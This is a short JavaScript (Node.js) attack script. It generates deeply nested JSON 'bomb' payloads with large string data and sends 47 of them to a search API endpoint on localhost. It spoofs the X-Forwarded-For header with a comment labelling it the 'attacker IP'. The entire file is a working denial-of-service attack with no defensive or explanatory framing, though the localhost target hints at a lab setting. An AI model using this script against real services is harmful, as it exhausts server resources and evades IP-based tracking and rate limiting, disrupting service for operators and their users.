import fetch from "node-fetch"

function generateJsonBomb(depth, payloadSize) {
  let root = {}
  let current = root

  for (let i = 0; i < depth; i++) {
    current.child = {}
    current = current.child
  }

  current.data = "A".repeat(payloadSize)
  return root
}

async function attack() {
  for (let i = 0; i < 47; i++) {
    const payload = generateJsonBomb(80, 120_000)

    await fetch("http://localhost:4000/api/search", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Forwarded-For": "203.0.113.45" // attacker IP
      },
      body: JSON.stringify(payload)
    })

    // small delay between requests
    await new Promise(r => setTimeout(r, 300))
  }

  console.log("💥 JSON payload bomb attack completed")
}

attack()
